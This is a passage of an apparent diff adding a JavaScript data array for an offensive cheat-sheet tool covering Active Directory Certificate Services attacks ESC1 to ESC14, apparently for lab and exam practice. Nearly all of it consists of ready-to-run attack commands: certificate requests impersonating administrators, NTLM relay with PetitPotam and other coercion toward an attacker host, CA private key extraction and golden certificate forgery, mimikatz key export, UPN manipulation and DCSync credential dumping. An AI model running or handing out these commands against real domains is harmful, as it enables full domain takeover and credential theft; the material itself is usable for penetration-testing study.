+{num:11,cmd:'faketime "$(ntpdate -q ${DC_IP} | head -1 | awk \'{print $1,$2}\')" certipy auth -pfx ${PFX_FILE} -dc-ip ${DC_IP}',src:'faketime auth',tags:['linux','fail'],label:'If clock skew persists after ntpdate'},
+{num:12,cmd:'certipy auth -pfx ${PFX_FILE} -dc-ip ${DC_IP} -ldap-shell',src:'ldap-shell',tags:['linux','fail'],label:'If KDC_ERR_PADATA_TYPE_NOSUPP: use Schannel'},
+{num:13,cmd:'certipy auth -pfx ${PFX_FILE} -dc-ip ${DC_IP} -username ${TARGET_USER} -domain ${DOMAIN}',src:'certipy auth explicit',tags:['linux','alt'],label:'Explicit user+domain (ESC9/16 style)'},
+{type:'sub',label:'Windows Alternative: Certify.exe + Rubeus'},
+{num:14,cmd:'Certify.exe request /ca:${CA_HOST}\\\\${CA_NAME} /template:${TEMPLATE} /altname:${TARGET_USER} /sid:${TARGET_SID}',src:'Certify.exe',tags:['win']},
+{num:15,cmd:'openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out ${PFX_FILE} -passout pass:',src:'openssl PFX',tags:['linux'],label:'Convert PEM to PFX for Rubeus (CSP required!)'},
+{num:16,cmd:'Rubeus.exe asktgt /user:${TARGET_USER} /certificate:${PFX_FILE} /password:"" /domain:${DOMAIN} /dc:${DC_FQDN} /ptt /nowrap /getcredentials',src:'Rubeus asktgt',tags:['win']},
+{type:'desc',cls:'warn',text:'<strong>TOP 5 FAILURES:</strong> 1) Clock skew -> ntpdate | 2) Missing -sid -> KDC_ERR_CERTIFICATE_MISMATCH | 3) Wrong -ca format (certipy: corp-DC-CA / Certify: DC01\\\\corp-DC-CA) | 4) Template name case-sensitive | 5) -upn for users, -dns for machine accounts'}
+]},
+{phase:3,phaseName:'ESC2: Any Purpose EKU',shortName:'ESC2',color:'#f97316',items:[
+{type:'desc',cls:'warn',text:'<strong>ESC2 Conditions:</strong> Template has "Any Purpose" EKU (2.5.29.37.0) or NO EKU. Use as enrollment agent cert then on-behalf-of admin via ESC3 method.'},
+{num:1,cmd:'sudo ntpdate -u ${DC_IP}',src:'ntpdate',tags:['linux']},
+{num:2,cmd:'certipy req -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -target ${CA_HOST} -ca "${CA_NAME}" -template "${TEMPLATE}"',src:'certipy Step1',tags:['linux'],label:'Step 1: get Any Purpose cert for self'},
+{num:3,cmd:'certipy req -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -target ${CA_HOST} -ca "${CA_NAME}" -template User -pfx ${USERNAME}.pfx -on-behalf-of "${DOMAIN_SHORT}\\\\${TARGET_USER}"',src:'certipy Step2 OBO',tags:['linux'],label:'Step 2: request admin cert on-behalf-of (NETBIOS\\\\user format)'},
+{num:4,cmd:'certipy auth -pfx ${TARGET_USER}.pfx -dc-ip ${DC_IP}',src:'certipy auth',tags:['linux']},
+{type:'desc',cls:'warn',text:'<strong>CRITICAL:</strong> -on-behalf-of requires NETBIOS\\\\username NOT FQDN. Use DOMAIN_SHORT variable. If CERTSRV_E_SIGNATURE_COUNT error: target template is Schema v2, chain via ESC15 instead.'}
+]},
+{phase:4,phaseName:'ESC3: Enrollment Agent',shortName:'ESC3',color:'#8b5cf6',items:[
+{type:'desc',cls:'warn',text:'<strong>ESC3 Conditions:</strong> Template A has Cert Request Agent EKU (1.3.6.1.4.1.311.20.2.1). Template B is Schema v1 (User/Machine/SmartcardUser). Two-step: get agent cert then on-behalf-of.'},
+{num:1,cmd:'sudo ntpdate -u ${DC_IP}',src:'ntpdate',tags:['linux']},
+{num:2,cmd:'certipy req -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -target ${CA_HOST} -ca "${CA_NAME}" -template "${TEMPLATE}"',src:'certipy Step1',tags:['linux'],label:'Step 1: get Enrollment Agent certificate'},
+{num:3,cmd:'certipy req -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -target ${CA_HOST} -ca "${CA_NAME}" -template User -pfx ${USERNAME}.pfx -on-behalf-of "${DOMAIN_SHORT}\\\\${TARGET_USER}"',src:'certipy Step2 OBO',tags:['linux'],label:'Step 2: request admin cert on-behalf-of'},
+{num:4,cmd:'certipy auth -pfx ${TARGET_USER}.pfx -dc-ip ${DC_IP}',src:'certipy auth',tags:['linux']},
+{type:'sub',label:'Windows Alternative'},
+{num:5,cmd:'Certify.exe request /ca:${CA_HOST}\\\\${CA_NAME} /template:${TEMPLATE}',src:'Certify Step1',tags:['win']},
+{num:6,cmd:'Certify.exe request /ca:${CA_HOST}\\\\${CA_NAME} /template:User /onbehalfof:${DOMAIN_SHORT}\\\\${TARGET_USER} /enrollcert:${USERNAME}.pfx /enrollcertpw:""',src:'Certify Step2',tags:['win']},
+{type:'desc',cls:'tip',text:'<strong>If CERTSRV_E_SIGNATURE_COUNT:</strong> Target template is Schema v2. Chain via ESC15 first: request agent cert with -application-policies "1.3.6.1.4.1.311.20.2.1" on Schema v1 template, then use as agent here.'}
+]},
+{phase:5,phaseName:'ESC4: Vulnerable Template ACL',shortName:'ESC4',color:'#14b8a6',items:[
+{type:'desc',cls:'warn',text:'<strong>ESC4 Conditions:</strong> WriteDacl/WriteOwner/WriteProperty/GenericAll on template AD object. ALWAYS backup first, ALWAYS restore after! Machines: HTB EscapeTwo, Vulnlab Sendai, HTB Coder.'},
+{type:'desc',cls:'warn',text:'<strong>EXAM CRITICAL: BACKUP FIRST. RESTORE AFTER. Leaving template modified = detected + permanent backdoor.</strong>'},
+{num:1,cmd:'sudo ntpdate -u ${DC_IP}',src:'ntpdate',tags:['linux']},
+{num:2,cmd:'certipy template -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -template "${TEMPLATE}" -save-configuration ${TEMPLATE}_backup.json',src:'certipy backup v5',tags:['linux'],label:'STEP 1: BACKUP (Certipy v5 - do this FIRST)'},
+{num:3,cmd:'certipy template -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -template "${TEMPLATE}" -save-old',src:'certipy backup v4',tags:['linux','alt'],label:'Certipy v4 alternative: -save-old'},
+{num:4,cmd:'certipy template -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -template "${TEMPLATE}" -write-default-configuration -force',src:'certipy modify v5',tags:['linux'],label:'STEP 2: Make vulnerable (Certipy v5)'},
+{num:5,cmd:'certipy req -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -target ${CA_HOST} -ca "${CA_NAME}" -template "${TEMPLATE}" -upn ${TARGET_UPN} -sid ${TARGET_SID}',src:'certipy req ESC1',tags:['linux'],label:'STEP 3: Request as admin (now ESC1-like)'},
+{num:6,cmd:'certipy auth -pfx ${PFX_FILE} -dc-ip ${DC_IP}',src:'certipy auth',tags:['linux']},
+{num:7,cmd:'certipy template -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -template "${TEMPLATE}" -write-configuration ${TEMPLATE}_backup.json -no-save',src:'certipy RESTORE v5',tags:['linux'],label:'STEP 4: RESTORE (Certipy v5 - MANDATORY)'},
+{type:'sub',label:'Alternatives if certipy template fails'},
+{num:8,cmd:'bloodyAD -d ${DOMAIN} -u ${USERNAME} -p "${PASSWORD}" --host ${DC_IP} set object "CN=${TEMPLATE},CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" msPKI-Certificate-Name-Flag -v 1',src:'bloodyAD',tags:['linux','alt'],label:'bloodyAD alternative'},
+{num:9,cmd:'Set-DomainObject -Identity "CN=${TEMPLATE},CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -XOR @{"msPKI-Certificate-Name-Flag"=1}',src:'PowerView',tags:['win','alt'],label:'PowerView alternative'},
+{type:'desc',cls:'warn',text:'<strong>TOP FAILURES:</strong> 1) Not saving backup | 2) Forgetting restore | 3) Certipy v4 vs v5 flag differences (-save-old vs -write-default-configuration) | 4) Template name case mismatch | 5) ESC4 makes changes visible in event logs - restore immediately'}
+]},
+{phase:6,phaseName:'ESC5: Vulnerable PKI Object ACL',shortName:'ESC5',color:'#ec4899',items:[
+{type:'desc',cls:'warn',text:'<strong>ESC5 Conditions:</strong> GenericAll/WriteDacl on CA computer object, NTAuthCertificates, Enrollment Services container, Templates Container, AIA, or CDP. Forest-wide compromise.'},
+{num:1,cmd:'dsacls "CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"',src:'dsacls',tags:['win'],label:'Check NTAuthCertificates ACL'},
+{num:2,cmd:'certipy ca -backup -u ${TARGET_USER}@${DOMAIN} -hashes :${NTHASH} -ca "${CA_NAME}" -target ${CA_HOST} -dc-ip ${DC_IP}',src:'certipy ca backup',tags:['linux'],label:'Path A: Extract CA key (ManageCA or local admin)'},
+{num:3,cmd:'certipy shadow auto -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -account ${CA_HOST%%.*}$',src:'shadow CA',tags:['linux'],label:'Path B: Shadow creds on CA machine account'},
+{num:4,cmd:'certipy forge -ca-pfx ${CA_NAME}.pfx -upn ${TARGET_UPN} -sid ${TARGET_SID} -crl "ldap:///" -out ${TARGET_USER}_forged.pfx',src:'certipy forge',tags:['linux'],label:'After CA key extraction: forge any cert'},
+{num:5,cmd:'certipy auth -pfx ${TARGET_USER}_forged.pfx -dc-ip ${DC_IP}',src:'certipy auth',tags:['linux']}
+]},
+{phase:7,phaseName:'ESC6: EDITF Flag',shortName:'ESC6',color:'#06b6d4',items:[
+{type:'desc',cls:'warn',text:'<strong>ESC6 Conditions:</strong> CA flag EDITF_ATTRIBUTESUBJECTALTNAME2 allows ANY template to honor user-supplied SAN. Mostly patched by KB5014754. Must chain with ESC9/ESC16 on patched systems.'},
+{num:1,cmd:'certutil -config "${DC_FQDN}\\\\${CA_NAME}" -getreg policy\\\\EditFlags',src:'certutil detect',tags:['win'],label:'Check for EDITF_ATTRIBUTESUBJECTALTNAME2'},
+{num:2,cmd:'certipy find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -vulnerable -stdout | grep -A5 "ESC6"',src:'certipy detect',tags:['linux'],label:'Certipy detection - User Specified SAN: Enabled'},
+{num:3,cmd:'sudo ntpdate -u ${DC_IP} && certipy req -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -target ${CA_HOST} -ca "${CA_NAME}" -template User -upn ${TARGET_UPN} -sid ${TARGET_SID}',src:'certipy req ESC6',tags:['linux'],label:'Exploit on unpatched DC'},
+{num:4,cmd:'certipy auth -pfx ${PFX_FILE} -dc-ip ${DC_IP}',src:'certipy auth',tags:['linux']},
+{num:5,cmd:'Certify.exe request /ca:${CA_HOST}\\\\${CA_NAME} /template:User /altname:${TARGET_USER} /sid:${TARGET_SID}',src:'Certify',tags:['win','alt']},
+{type:'desc',cls:'tip',text:'<strong>Patched systems:</strong> ESC6 alone fails. Chain: get victim with GenericWrite -> ESC9 UPN flip -> request with this CA -> authenticate. Or use ESC16 if DisableExtensionList is set.'}
+]},
+{phase:8,phaseName:'ESC7: ManageCA Abuse',shortName:'ESC7',color:'#f59e0b',items:[
+{type:'desc',cls:'warn',text:'<strong>ESC7 Conditions:</strong> ManageCA right (full CA admin) or ManageCertificates right. 5-step SubCA chain. HTB Manager reference machine. CLEANUP SCRIPT EVERY 10MIN on Manager.'},
+{num:1,cmd:'sudo ntpdate -u ${DC_IP}',src:'ntpdate',tags:['linux']},
+{num:2,cmd:'certipy ca -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -target ${DC_FQDN} -ca "${CA_NAME}" -add-officer ${USERNAME}',src:'certipy add-officer',tags:['linux'],label:'STEP 1: Self-grant ManageCertificates (needs ManageCA)'},
+{num:3,cmd:'certipy ca -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -target ${DC_FQDN} -ca "${CA_NAME}" -enable-template SubCA',src:'certipy enable-template',tags:['linux'],label:'STEP 2: Enable SubCA template'},
+{num:4,cmd:'certipy req -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -target ${DC_FQDN} -ca "${CA_NAME}" -template SubCA -upn ${TARGET_UPN}',src:'certipy req SubCA',tags:['linux'],label:'STEP 3: Request (WILL BE DENIED) - SAVE the .key file! Note REQUEST_ID!'},
+{num:5,cmd:'certipy ca -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -target ${DC_FQDN} -ca "${CA_NAME}" -issue-request ${REQUEST_ID}',src:'certipy issue',tags:['linux'],label:'STEP 4: Issue/approve the denied request (fill REQUEST_ID above!)'},
+{num:6,cmd:'certipy req -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -target ${DC_FQDN} -ca "${CA_NAME}" -retrieve ${REQUEST_ID}',src:'certipy retrieve',tags:['linux'],label:'STEP 5: Retrieve the issued cert (auto-loads .key file)'},
+{num:7,cmd:'certipy auth -pfx ${PFX_FILE} -dc-ip ${DC_IP}',src:'certipy auth',tags:['linux']},
+{type:'sub',label:'ManageCertificates-only scenario'},
+{num:8,cmd:'certipy ca -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -target ${DC_FQDN} -ca "${CA_NAME}" -list-requests',src:'list pending',tags:['linux'],label:'List pending requests'},
+{num:9,cmd:'certipy ca -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -target ${DC_FQDN} -ca "${CA_NAME}" -issue-request ${REQUEST_ID}',src:'issue pending',tags:['linux'],label:'Approve existing pending request'},
+{type:'sub',label:'Windows PSPKI Alternative'},
+{num:10,cmd:'Import-Module PSPKI; Get-CertificationAuthority -ComputerName ${CA_HOST} | Add-CertificationAuthorityOfficer -User "${DOMAIN_SHORT}\\\\${USERNAME}"',src:'PSPKI',tags:['win','alt']},
+{num:11,cmd:'certutil -resubmit ${REQUEST_ID}',src:'certutil approve',tags:['win','alt']},
+{type:'desc',cls:'warn',text:'<strong>TOP FAILURES:</strong> 1) Not answering "y" to save .key file when request denied | 2) Wrong REQUEST_ID | 3) Cleanup script reset officer on Manager | 4) -target must be CA_HOST FQDN (not IP) | 5) SubCA template not published by default'}
+]},
+{phase:9,phaseName:'ESC8: NTLM Relay to Web Enrollment',shortName:'ESC8',color:'#84cc16',items:[
+{type:'desc',cls:'warn',text:'<strong>ESC8 Conditions:</strong> Web Enrollment role enabled at http://CA/certsrv/. No EPA. Coerce DC to authenticate to attacker -> relay -> get DC machine cert -> DCSync.'},
+{num:1,cmd:'sudo systemctl stop smbd nmbd && echo 0 | sudo tee /proc/sys/net/ipv4/ip_unprivileged_port_start',src:'free port 445',tags:['linux'],label:'FIRST: free port 445 for relay'},
+{num:2,cmd:'sudo impacket-ntlmrelayx -t "http://${CA_HOST}/certsrv/certfnsh.asp" -smb2support --adcs --template DomainController',src:'ntlmrelayx',tags:['linux'],label:'TERMINAL 1: Start relay listener'},
+{num:3,cmd:'sudo certipy relay -target "http://${CA_HOST}" -template DomainController -dc-ip ${DC_IP}',src:'certipy relay',tags:['linux','alt'],label:'TERMINAL 1 Alt: certipy relay (auto-saves PFX)'},
+{num:4,cmd:'python3 PetitPotam.py -u ${USERNAME} -p "${PASSWORD}" -d ${DOMAIN} ${ATTACKER_IP} ${DC_IP}',src:'PetitPotam auth',tags:['linux'],label:'TERMINAL 2: Coerce DC (MS-EFSRPC, needs creds on patched)'},
+{num:5,cmd:'python3 PetitPotam.py ${ATTACKER_IP} ${DC_IP}',src:'PetitPotam unauth',tags:['linux','alt'],label:'Unauthenticated (pre-CVE-2021-36942 patch)'},
+{num:6,cmd:'coercer coerce -l ${ATTACKER_IP} -t ${DC_IP} -u ${USERNAME} -p "${PASSWORD}" -d ${DOMAIN} --always-continue',src:'Coercer',tags:['linux','alt'],label:'Coercer: tries all 12+ methods'},
+{num:7,cmd:'python3 dfscoerce.py -u ${USERNAME} -p "${PASSWORD}" -d ${DOMAIN} ${ATTACKER_IP} ${DC_IP}',src:'DFSCoerce',tags:['linux','alt'],label:'MS-DFSNM coercion'},
+{num:8,cmd:'python3 printerbug.py "${DOMAIN}/${USERNAME}:${PASSWORD}@${DC_IP}" ${ATTACKER_IP}',src:'printerbug',tags:['linux','alt'],label:'MS-RPRN (needs Print Spooler running)'},
+{num:9,cmd:'nxc smb ${DC_IP} -u ${USERNAME} -p "${PASSWORD}" -d ${DOMAIN} -M coerce_plus -o LISTENER=${ATTACKER_IP}',src:'nxc coerce',tags:['linux','alt'],label:'nxc multi-method coercion'},
+{num:10,cmd:'echo "BASE64_FROM_NTLMRELAYX_OUTPUT" | base64 -d > dc01.pfx',src:'decode cert',tags:['linux'],label:'Decode base64 PFX from ntlmrelayx output'},
+{num:11,cmd:'certipy auth -pfx dc01.pfx -dc-ip ${DC_IP}',src:'certipy auth',tags:['linux']},
+{num:12,cmd:'impacket-secretsdump -hashes :${NTHASH} "${DOMAIN}/DC01$@${DC_IP}" -just-dc',src:'DCSync',tags:['linux'],label:'DCSync with DC machine hash'},
+{type:'desc',cls:'warn',text:'<strong>TOP FAILURES:</strong> 1) Port 445 in use (stop smbd) | 2) EPA enabled on CA | 3) No web enrollment role on CA_HOST | 4) Listener must start BEFORE coercion | 5) HTTPS: may need --no-http-server flag'}
+]},
+{phase:10,phaseName:'ESC9: No Security Extension (UPN Flip)',shortName:'ESC9',color:'#d946ef',items:[
+{type:'desc',cls:'warn',text:'<strong>ESC9 Conditions:</strong> Template has CT_FLAG_NO_SECURITY_EXTENSION + DC StrongCertificateBindingEnforcement=0 or 1 + attacker has GenericWrite on VICTIM. HTB Certified reference machine.'},
+{type:'desc',cls:'warn',text:'<strong>CRITICAL: UPN must be bare "administrator" (NO @domain) to avoid collision. RESTORE UPN BEFORE auth. Forgetting this breaks victim logon.</strong>'},
+{num:1,cmd:'sudo ntpdate -u ${DC_IP}',src:'ntpdate',tags:['linux']},
+{num:2,cmd:'certipy account read -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -user ${VICTIM_USER}',src:'read UPN',tags:['linux'],label:'STEP 1: Read current UPN (save original for restore!)'},
+{num:3,cmd:'certipy shadow auto -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -account ${VICTIM_USER}',src:'shadow auto',tags:['linux'],label:'STEP 2 (optional): Get victim hash via shadow creds'},
+{num:4,cmd:'certipy account update -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -user ${VICTIM_USER} -upn ${TARGET_USER}',src:'update UPN',tags:['linux'],label:'STEP 3: Set UPN to bare "administrator" (NO @domain!)'},
+{num:5,cmd:'certipy req -u ${VICTIM_USER}@${DOMAIN} -hashes :${VICTIM_HASH} -dc-ip ${DC_IP} -target ${CA_HOST} -ca "${CA_NAME}" -template "${TEMPLATE}"',src:'certipy req',tags:['linux'],label:'STEP 4: Request cert as victim'},
+{num:6,cmd:'certipy account update -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -user ${VICTIM_USER} -upn ${VICTIM_USER}@${DOMAIN}',src:'RESTORE UPN',tags:['linux'],label:'STEP 5: RESTORE UPN (do this IMMEDIATELY before auth)'},
+{num:7,cmd:'certipy auth -pfx ${PFX_FILE} -dc-ip ${DC_IP} -username ${TARGET_USER} -domain ${DOMAIN}',src:'certipy auth',tags:['linux'],label:'STEP 6: Auth - must specify -username and -domain'},
+{type:'sub',label:'Alternative UPN modification tools'},
+{num:8,cmd:'bloodyAD -d ${DOMAIN} -u ${USERNAME} -p "${PASSWORD}" --host ${DC_IP} set object ${VICTIM_USER} userPrincipalName -v ${TARGET_USER}',src:'bloodyAD',tags:['linux','alt']},
+{num:9,cmd:'Set-DomainObject -Identity ${VICTIM_USER} -Set @{userPrincipalName="${TARGET_USER}"} -Domain ${DOMAIN}',src:'PowerView',tags:['win','alt']},
+{type:'desc',cls:'warn',text:'<strong>TOP FAILURES:</strong> 1) UPN set to "admin@domain" instead of bare "admin" (collision!) | 2) Forgot to restore UPN -> victim cant log in | 3) -domain flag missing on auth | 4) Feb 2025: SBE=2 blocks ESC9 alone, chain with ESC6/16 | 5) Wrong VICTIM_HASH'}
+]},
+{phase:11,phaseName:'ESC10: Weak Certificate Mappings',shortName:'ESC10',color:'#06b6d4',items:[
+{type:'desc',cls:'warn',text:'<strong>ESC10 Conditions:</strong> Case A: Kerberos StrongCertificateBindingEnforcement=0 registry key. Case B: Schannel CertificateMappingMethods includes UPN bit (0x4). GenericWrite on victim.'},
+{num:1,cmd:'reg query "HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\Kdc" /v StrongCertificateBindingEnforcement',src:'reg SBE',tags:['win'],label:'Detect Case A: value 0=vulnerable'},
+{num:2,cmd:'reg query "HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\Schannel" /v CertificateMappingMethods',src:'reg Schannel',tags:['win'],label:'Detect Case B: includes 0x4=UPN mapping'},
+{type:'sub',label:'Case A: Kerberos (SBE=0) - same as ESC9 but ANY client-auth template'},
+{num:3,cmd:'sudo ntpdate -u ${DC_IP} && certipy account update -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -user ${VICTIM_USER} -upn ${TARGET_USER}',src:'update UPN',tags:['linux'],label:'Case A Step 1: UPN flip'},
+{num:4,cmd:'certipy req -u ${VICTIM_USER}@${DOMAIN} -hashes :${VICTIM_HASH} -dc-ip ${DC_IP} -ca "${CA_NAME}" -template User',src:'certipy req',tags:['linux'],label:'Case A Step 2: request with User template'},
+{num:5,cmd:'certipy account update -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -user ${VICTIM_USER} -upn ${VICTIM_USER}@${DOMAIN}',src:'restore UPN',tags:['linux'],label:'Case A Step 3: RESTORE UPN'},
+{num:6,cmd:'certipy auth -pfx ${PFX_FILE} -dc-ip ${DC_IP} -username ${TARGET_USER} -domain ${DOMAIN}',src:'certipy auth',tags:['linux']},
+{type:'sub',label:'Case B: Schannel (machine accounts or NULL-UPN only)'},
+{num:7,cmd:'certipy shadow auto -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -account ${VICTIM_USER}',src:'shadow auto',tags:['linux'],label:'Case B Step 1: get victim hash'},
+{num:8,cmd:'certipy account update -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -user ${VICTIM_USER} -upn "${DC_FQDN%%.*}$@${DOMAIN}"',src:'update UPN machine',tags:['linux'],label:'Case B Step 2: spoof DC machine account UPN'},
+{num:9,cmd:'certipy req -u ${VICTIM_USER}@${DOMAIN} -hashes :${VICTIM_HASH} -ca "${CA_NAME}" -template User',src:'certipy req',tags:['linux'],label:'Case B Step 3: request cert'},
+{num:10,cmd:'certipy account update -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -user ${VICTIM_USER} -upn ${VICTIM_USER}@${DOMAIN}',src:'restore UPN',tags:['linux'],label:'Case B Step 4: RESTORE UPN'},
+{num:11,cmd:'certipy auth -pfx ${PFX_FILE} -dc-ip ${DC_IP} -ldap-shell',src:'certipy ldap-shell',tags:['linux'],label:'Case B: use -ldap-shell (Schannel, not PKINIT)'},
+{type:'desc',cls:'tip',text:'<strong>Case B LDAP shell commands:</strong> add_user_to_group ${USERNAME} "Domain Admins" | change_password ${VICTIM_USER} NewPass! | set_rbcd $TARGET $GRANTEE | get_laps_password $COMPUTER'}
+]},
+{phase:12,phaseName:'ESC11: ICPR RPC Relay',shortName:'ESC11',color:'#84cc16',items:[
+{type:'desc',cls:'warn',text:'<strong>ESC11 Conditions:</strong> CA InterfaceFlags lacks IF_ENFORCEENCRYPTICERTREQUEST (0x200). Like ESC8 but relays to RPC ICPR endpoint. No web enrollment needed.'},
+{num:1,cmd:'certutil -config "${DC_FQDN}\\\\${CA_NAME}" -getreg CA\\\\InterfaceFlags',src:'certutil detect',tags:['win'],label:'Detect: flag absent = vulnerable'},
+{num:2,cmd:'certipy find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -vulnerable -stdout | grep -i "ESC11\\|ICPR\\|Enforce"',src:'certipy detect',tags:['linux']},
+{num:3,cmd:'sudo certipy relay -target "rpc://${CA_HOST}" -ca "${CA_NAME}" -template DomainController -dc-ip ${DC_IP}',src:'certipy relay RPC',tags:['linux'],label:'TERMINAL 1: RPC relay'},
+{num:4,cmd:'python3 PetitPotam.py -u ${USERNAME} -p "${PASSWORD}" -d ${DOMAIN} ${ATTACKER_IP} ${DC_IP}',src:'PetitPotam',tags:['linux'],label:'TERMINAL 2: Coerce'},
+{num:5,cmd:'certipy auth -pfx dc01.pfx -dc-ip ${DC_IP}',src:'certipy auth',tags:['linux']}
+]},
+{phase:13,phaseName:'ESC12: Shell on CA - Golden Cert',shortName:'ESC12',color:'#f97316',items:[
+{type:'desc',cls:'warn',text:'<strong>ESC12 Conditions:</strong> Admin/SYSTEM shell on CA host, or ManageCA right. Extract CA private key -> forge arbitrary certs (Golden Certificate). Used in HTB Certificate.'},
+{num:1,cmd:'certipy ca -backup -u ${USERNAME}@${DOMAIN} -hashes :${NTHASH} -ca "${CA_NAME}" -target ${CA_HOST} -dc-ip ${DC_IP}',src:'certipy backup remote',tags:['linux'],label:'Method 1: Remote backup (ManageCA or CA admin)'},
+{num:2,cmd:'certutil -backupKey -f -p "Backup@Pass" C:\\\\Backup && certutil -exportPFX -p "Export@Pass" My <SERIAL> ${CA_NAME}.pfx',src:'certutil backup',tags:['win'],label:'Method 2: certutil on CA host (local admin)'},
+{num:3,cmd:'mimikatz.exe "privilege::debug" "crypto::capi" "crypto::cng" "crypto::certificates /systemstore:LOCAL_MACHINE /store:MY /export" "exit"',src:'mimikatz',tags:['win','alt'],label:'Method 3: mimikatz (non-exportable keys, PFX password="mimikatz")'},
+{num:4,cmd:'certipy forge -ca-pfx ${CA_NAME}.pfx -upn ${TARGET_UPN} -sid ${TARGET_SID} -subject "CN=Administrator,CN=Users,DC=corp,DC=local" -crl "ldap:///" -out ${TARGET_USER}_forged.pfx',src:'certipy forge',tags:['linux'],label:'Forge administrator cert'},
+{num:5,cmd:'certipy auth -pfx ${TARGET_USER}_forged.pfx -dc-ip ${DC_IP}',src:'certipy auth',tags:['linux']},
+{type:'desc',cls:'warn',text:'<strong>YubiHSM2:</strong> Check reg query "HKLM\\\\SOFTWARE\\\\Yubico\\\\YubiHSM" /v AuthKeysetPassword. TPM-protected keys cannot be exfiltrated - use certipy forge via running CA process.'}
+]},
+{phase:14,phaseName:'ESC13: OID Group Link',shortName:'ESC13',color:'#14b8a6',items:[
+{type:'desc',cls:'warn',text:'<strong>ESC13 Conditions:</strong> Template links to issuance policy OID with msDS-OIDToGroupLink pointing to privileged Universal group. Auth with cert adds group to PAC. Certipy >= 4.8.2 required.'},
+{num:1,cmd:'certipy find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -vulnerable -oids -stdout | grep -A10 "ESC13"',src:'certipy detect',tags:['linux'],label:'Detect: look for ESC13 + Linked Groups'},
+{num:2,cmd:'certipy req -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -target ${CA_HOST} -ca "${CA_NAME}" -template "${TEMPLATE}"',src:'certipy req',tags:['linux'],label:'Request cert (PAC gets group membership via OID)'},
+{num:3,cmd:'certipy auth -pfx ${PFX_FILE} -dc-ip ${DC_IP}',src:'certipy auth',tags:['linux'],label:'Authenticate - TGT contains linked group SID'},
+{num:4,cmd:'export KRB5CCNAME=${PFX_FILE%.pfx}.ccache && impacket-secretsdump -k -no-pass -just-dc ${DOMAIN}/${USERNAME}@${DC_FQDN}',src:'secretsdump',tags:['linux']},
+{num:5,cmd:'bloodyAD -d ${DOMAIN} -u ${USERNAME} -p "${PASSWORD}" --host ${DC_IP} set object "CN=OID_CN,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" msDS-OIDToGroupLink -v "CN=Enterprise Admins,CN=Users,DC=corp,DC=local"',src:'bloodyAD set OID',tags:['linux','alt'],label:'If GenericWrite on OID: write link to privileged group'}
+]},
+{phase:15,phaseName:'ESC14: altSecurityIdentities Abuse',shortName:'ESC14',color:'#ec4899',items:[
+{type:'desc',cls:'warn',text:'<strong>ESC14 Conditions:</strong> Write access to target altSecurityIdentities attribute. 4 scenarios: (A) write strong mapping, (B) RFC822 mapping+write mail, (C) IssuerSubject mapping, (D) SubjectOnly. HTB Scepter machine.'},
+{type:'sub',label:'Scenario B (most common): target has X509 RFC822 mapping'},
+{num:1,cmd:'bloodyAD -d ${DOMAIN} -u ${USERNAME} -p "${PASSWORD}" --host ${DC_IP} set object ${VICTIM_USER} mail -v ${TARGET_USER}@${DOMAIN}',src:'set mail B',tags:['linux'],label:'Scenario B Step 1: modify victim mail attribute'},
+{num:2,cmd:'certipy req -u ${VICTIM_USER}@${DOMAIN} -hashes :${VICTIM_HASH} -dc-ip ${DC_IP} -target ${CA_HOST} -ca "${CA_NAME}" -template "${TEMPLATE}"',src:'certipy req',tags:['linux'],label:'Scenario B Step 2: request cert'},
